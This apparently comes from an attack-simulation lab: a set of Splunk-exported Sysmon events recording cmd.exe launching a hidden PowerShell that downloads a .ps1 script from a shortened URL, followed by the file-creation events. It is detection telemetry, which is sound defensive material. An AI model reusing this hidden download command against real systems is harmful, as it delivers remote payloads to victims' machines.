{"preview":false,"result":{"_time":"2020-11-20T09:36:07.061+0400","EventRecordID":"13586","_raw":"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2020-11-20T09:36:07.061736400Z'/><EventRecordID>13586</EventRecordID><Correlation/><Execution ProcessID='3148' ThreadID='3532'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-555.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2020-11-20 09:36:07.059</Data><Data Name='ProcessGuid'>{E036F963-8E07-5FB7-0000-0010BC122200}</Data><Data Name='ProcessId'>2760</Data><Data Name='Image'>C:\\Windows\\System32\\cmd.exe</Data><Data Name='FileVersion'>10.0.14393.0 (rs1_release.160715-1616)</Data><Data Name='Description'>Windows Command Processor</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Cmd.Exe</Data><Data Name='CommandLine'>\"C:\\Windows\\system32\\cmd.exe\" </Data><Data Name='CurrentDirectory'>C:\\Users\\Administrator\\</Data><Data Name='User'>ATTACKRANGE\\Administrator</Data><Data Name='LogonGuid'>{E036F963-8D6C-5FB7-0000-0020F55A1A00}</Data><Data Name='LogonId'>0x1a5af5</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A</Data><Data Name='ParentProcessGuid'>{E036F963-8D6D-5FB7-0000-0010B8B71A00}</Data><Data Name='ParentProcessId'>3680</Data><Data Name='ParentImage'>C:\\Windows\\explorer.exe</Data><Data Name='ParentCommandLine'>C:\\Windows\\Explorer.EXE /NOUACCHECK</Data></EventData></Event>"}}
{"preview":false,"result":{"_time":"2020-11-20T09:40:20.782+0400","EventRecordID":"14032","_raw":"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2020-11-20T09:40:20.782198600Z'/><EventRecordID>14032</EventRecordID><Correlation/><Execution ProcessID='3148' ThreadID='3532'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-555.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2020-11-20 09:40:20.780</Data><Data Name='ProcessGuid'>{E036F963-8F04-5FB7-0000-00105CD62200}</Data><Data Name='ProcessId'>1668</Data><Data Name='Image'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name='FileVersion'>10.0.14393.206 (rs1_release.160915-0644)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>powershell  -WindowStyle hidden -c \"(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1')\"</Data><Data Name='CurrentDirectory'>C:\\Users\\Administrator\\</Data><Data Name='User'>ATTACKRANGE\\Administrator</Data><Data Name='LogonGuid'>{E036F963-8D6C-5FB7-0000-0020F55A1A00}</Data><Data Name='LogonId'>0x1a5af5</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453</Data><Data Name='ParentProcessGuid'>{E036F963-8E07-5FB7-0000-0010BC122200}</Data><Data Name='ParentProcessId'>2760</Data><Data Name='ParentImage'>C:\\Windows\\System32\\cmd.exe</Data><Data Name='ParentCommandLine'>\"C:\\Windows\\system32\\cmd.exe\" </Data></EventData></Event>"}}
{"preview":false,"result":{"_time":"2020-11-20T09:40:20.821+0400","EventRecordID":"14041","_raw":"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2020-11-20T09:40:20.821729200Z'/><EventRecordID>14041</EventRecordID><Correlation/><Execution ProcessID='3148' ThreadID='3532'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-555.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2020-11-20 09:40:20.808</Data><Data Name='ProcessGuid'>{E036F963-8F04-5FB7-0000-00105CD62200}</Data><Data Name='ProcessId'>1668</Data><Data Name='Image'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name='TargetFilename'>C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_tdane23i.lg4.ps1</Data><Data Name='CreationUtcTime'>2020-11-20 09:40:20.808</Data></EventData></Event>"}}
{"preview":false,"result":{"_time":"2020-11-20T09:40:21.103+0400","EventRecordID":"14046","_raw":"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2020-11-20T09:40:21.103257600Z'/><EventRecordID>14046</EventRecordID><Correlation/><Execution ProcessID='3148' ThreadID='3532'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-555.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2020-11-20 09:40:21.089</Data><Data Name='ProcessGuid'>{E036F963-8F04-5FB7-0000-00105CD62200}</Data><Data Name='ProcessId'>1668</Data><Data Name='Image'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name='TargetFilename'>C:\\Users\\Administrator\\Default_File_Path.ps1</Data><Data Name='CreationUtcTime'>2020-11-20 09:37:54.744</Data></EventData></Event>"},"lastrow":true}
